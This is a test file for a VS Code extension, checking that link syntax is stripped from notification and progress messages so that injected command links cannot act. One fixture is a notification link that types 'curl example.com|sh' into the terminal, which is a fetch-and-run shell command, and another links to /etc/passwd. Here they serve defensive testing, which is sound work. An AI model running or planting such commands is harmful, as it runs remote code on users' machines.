// SPDX-License-Identifier: MIT
// © 2026 Hannes Stauss (scalarion@nimblescape.com)
// Licensed under the MIT License. See LICENSE in the repository root for details.

import * as fs from 'fs';
import * as path from 'path';
import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('vscode', async () => (await import('./testing/fakeVscode')).fakeVscode);

import { UserFacingError } from '../core/errors';
import { Messages } from '../core/messages';
import { hostAccessReport } from '../core/policy/single';
import { showError } from './errors';
import { showErrorMessage, showInformationMessage, showWarningMessage, withoutLinks } from './notifications';
import { withNotificationProgress } from './progress';
import { progressMessage } from './progress';
import { fakeVscode, resetFakeVscode } from './testing/fakeVscode';

// The links that VS Code renders in the text of a notification: the regular expression of
// src/vs/base/common/linkedText.ts of VS Code (parseLinkedText), which the notifications use.
const VSCODE_LINK = /\[([^\]]+)\]\(((?:https?:\/\/|command:|file:)[^\)\s]+)(?: (["'])(.+?)(\3))?\)/gi;
const links = (text: string) => [...text.matchAll(VSCODE_LINK)].map((match) => match[2]);

// A link that types a command into the terminal of the window.
const TERMINAL_LINK = '[Fix the configuration](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22curl%20example.com%7Csh%5Cn%22%7D)';

const { window } = fakeVscode;

beforeEach(() => resetFakeVscode());

describe('withoutLinks', () => {
  it('leaves no link of VS Code in the text, and changes nothing else that is visible', () => {
    const texts = [
      TERMINAL_LINK,
      `argument ${TERMINAL_LINK}, argument [b](https://example.com)`,
      '[a](file:///etc/passwd "title") and [b](command:x \'title\')',
      '[[nested]](command:x)',
      ']]((command:x)',
      'no link [here] (command:x) [or](here',
    ];
    for (const text of texts) {
      const plain = withoutLinks(text);
      expect(links(plain), text).toEqual([]);
      expect(plain.replaceAll('\u200b', '')).toBe(text);
    }
    expect(links(TERMINAL_LINK)).toHaveLength(1);
  });

  it('keeps a text without the middle of a link as it is', () => {
    expect(withoutLinks('Opening acme/api… [x] (y)')).toBe('Opening acme/api… [x] (y)');
  });
});

describe('the messages', () => {
  it('show the message and the detail of the options without links, and keep the items', async () => {
    const item = { title: 'Rebuild Now' };
    window.showWarningMessage.mockResolvedValue(item);
    const choice = await showWarningMessage(`a ${TERMINAL_LINK}`, { modal: true, detail: `b ${TERMINAL_LINK}` }, item);
    expect(choice).toBe(item);
    const [message, options, given] = window.showWarningMessage.mock.calls[0] as [string, { modal: boolean; detail: string }, unknown];
    expect(links(message)).toEqual([]);
    expect(links(options.detail)).toEqual([]);
    expect(options.modal).toBe(true);
    expect(given).toBe(item);
  });

  it('pass string items, and a first item that is a MessageItem, unchanged', async () => {
    await showInformationMessage(`a ${TERMINAL_LINK}`, 'Open', 'Later');
    expect(window.showInformationMessage).toHaveBeenCalledWith(withoutLinks(`a ${TERMINAL_LINK}`), 'Open', 'Later');
    const item = { title: TERMINAL_LINK };
    await showErrorMessage('failed', item);
    expect(window.showErrorMessage.mock.calls[0][1]).toBe(item);
  });

  it('show the refusal of a configuration that names a link without the link', () => {
    // The text of a runArgs entry, as the host access check quotes it in its refusal.
    const report = hostAccessReport({ ownVolume: 'devspaces-acme-api-sturdy-kahn', config: { runArgs: [TERMINAL_LINK] } });
    const message = Messages.unsupportedOptions(report.unsupported.join(', '));
    expect(links(message)).toHaveLength(1);
    const logger = { info: vi.fn(), warn: vi.fn(), error: vi.fn(), output: vi.fn() };
    showError(new UserFacingError('hostAccess', message), { logger, showLog: vi.fn() });
    const shown = [...window.showErrorMessage.mock.calls, ...window.showWarningMessage.mock.calls].map((call) => call[0] as string);
    expect(shown).toHaveLength(1);
    expect(shown[0].replaceAll('\u200b', '')).toBe(message);
    expect(links(shown[0])).toEqual([]);
    // The log keeps the text as it was.
    expect(logger.error.mock.calls[0][0]).toBe(message);
  });

  it('show the title and the detail of a progress notification without links, besides its own link Show details', () => {
    const text = progressMessage(`Opening ${TERMINAL_LINK}…`, 'downloadingImage', `Step ${TERMINAL_LINK}`);
    expect(links(text)).toEqual(['command:devspaces.showLog?%5B%22progressNotification%22%5D']);
  });

  it('show the title and every message of a progress notification without links, besides its own link Show details', async () => {
    const reported: Array<{ message: string }> = [];
    window.withProgress.mockImplementation(async (_options: unknown, task: (...args: unknown[]) => Promise<unknown>) =>
      task({ report: (value: { message: string }) => reported.push(value) }, { onCancellationRequested: () => ({ dispose() {} }) }),
    );
    await withNotificationProgress({ title: `Testing ${TERMINAL_LINK}`, cancellable: true }, async (progress) => {
      progress.report({ message: `step ${TERMINAL_LINK}`, increment: 10 });
      return 'done';
    });
    expect(reported.map((value) => links(value.message))).toEqual([['command:devspaces.showLog?%5B%22progressNotification%22%5D'], ['command:devspaces.showLog?%5B%22progressNotification%22%5D']]);
    expect(reported[1].message).toBe(`${withoutLinks(`Testing ${TERMINAL_LINK}`)} ${withoutLinks(`step ${TERMINAL_LINK}`)} [Show details](command:devspaces.showLog?%5B%22progressNotification%22%5D)`);
  });
});

describe('the sources', () => {
  const root = path.join(__dirname, '..');
  const sources = fs
    .readdirSync(root, { recursive: true, encoding: 'utf8' })
    .filter((file) => file.endsWith('.ts') && !file.endsWith('.test.ts') && !file.endsWith('.d.ts'))
    .map((file) => file.split(path.sep).join('/'))
    .filter((file) => !file.startsWith('vscode/testing/'));
  const offending = (pattern: RegExp, allowed: readonly string[]) =>
    sources.filter((file) => !allowed.includes(file) && pattern.test(fs.readFileSync(path.join(root, file), 'utf8')));

  it('are found', () => {
    expect(sources.length).toBeGreaterThan(100);
    expect(sources).toContain('vscode/notifications.ts');
  });

  // Every message goes through ./notifications; a direct call would show its text with links.
  it('call the show…Message functions of VS Code only in notifications.ts', () => {
    const direct =
      /\bwindow\s*\??\.\s*show(?:Information|Warning|Error)Message\b|\bshow(?:Information|Warning|Error)Message\b[^;]*=\s*(?:vscode\s*\.\s*)?window\b|=\s*vscode\s*\??\.\s*window\s*[;,)]/;
    expect(offending(direct, ['vscode/notifications.ts'])).toEqual([]);
  });

  // A progress notification renders links in its title and its messages too: progress.ts cleans its text and then adds
  // its link "Show details" (progressMessage), which opens the log and hides the notification.
  it('show a progress notification only in progress.ts', () => {
    expect(offending(/\bProgressLocation\s*\??\.\s*Notification\b/, ['vscode/progress.ts'])).toEqual([]);
  });
});
